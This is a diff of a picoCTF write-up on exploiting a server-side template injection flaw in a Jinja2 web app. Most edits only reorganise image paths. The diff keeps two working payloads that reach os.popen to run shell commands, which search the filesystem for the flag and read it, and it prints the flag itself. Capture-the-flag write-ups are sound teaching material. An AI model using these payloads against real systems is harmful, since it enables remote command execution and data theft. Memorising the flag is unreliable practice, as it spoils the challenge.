@@ -25,15 +25,11 @@
 
 The web app allows user to enter anything they want and announce it on the app.
 
-![web_app_screenshot](../images/web_app.png)
-
-_Web App_
+![web_app_screenshot](../images/SST1/web_app.png)
 
 The app has a form and user input was taken via a text field. Inspecting the page's source code in Burp Suite revealed nothing out of the oridinary.
 
-![web_app_screenshot](../images/source_code.png)
-
-_Web App Source Code_
+![web_app_screenshot](../images/SST1/source_code.png)
 
 ---
 
@@ -41,19 +37,13 @@ _Web App Source Code_
 
 Initially I tested the web app by entering some normal text like "hello world" to check the output and how the web app works.
 
-![test_input_screenshot](../images/test_input.png)
+![test_input_screenshot](../images/SST1/test_input.png)
 
-_Test Input in Web App_
-
-![output_screenshot](../images/output.png)
-
-_Output_
+![output_screenshot](../images/SST1/output.png)
 
 Checking the input request in Burp Suite revealed that the input was being encoded using URL encoding.
 
-![request_header_screenshot](../images/request_header.png)
-
-_Input Request Header_
+![request_header_screenshot](../images/SST1/request_header.png)
 
 ---
 
@@ -75,8 +65,7 @@ Test payload:
 
 Response received:
 
-![alt text](../images/image.png)
-_Output of test payload_
+![alt text](../images/SST1/image.png)
 
 Since this test payload worked, it confirmed the existence of SSTI vulnerability in the web app and also that its using Jinja2 as the template engine.
 
@@ -98,8 +87,7 @@ Let me break down this payload in simple terms:
 
 This payload worked and the user ids in the server was displayed.
 
-![alt text](../images/image-1.png)
-_SSTI payload_
+![alt text](../images/SST1/image-1.png)
 
 ---
 
@@ -111,8 +99,7 @@ Now to find the flag, the payload was slightly modified.
 {{config.__class__.__init__.__globals__.__builtins__.__import__('os').popen('find / -iname "flag*"').read()}}
 ```
 
-![alt text](../images/image-2.png)
-*Enumerating for flag*
+![alt text](../images/SST1/image-2.png)
 
 The location of the flag was found. Now a final payload to display the flag.
 
@@ -120,10 +107,11 @@ The location of the flag was found. Now a final payload to display the flag.
 {{config.__class__.__init__.__globals__.__builtins__.__import__('os').popen('cat /challenge/flag').read()}}
 ```
 
-![alt text](../images/image-3.png)
-*Displaying flag*
+![alt text](../images/SST1/image-3.png)
 
-Flag obtained:
+---
+
+## Flag obtained:
 
 ```
 picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_f5438664}
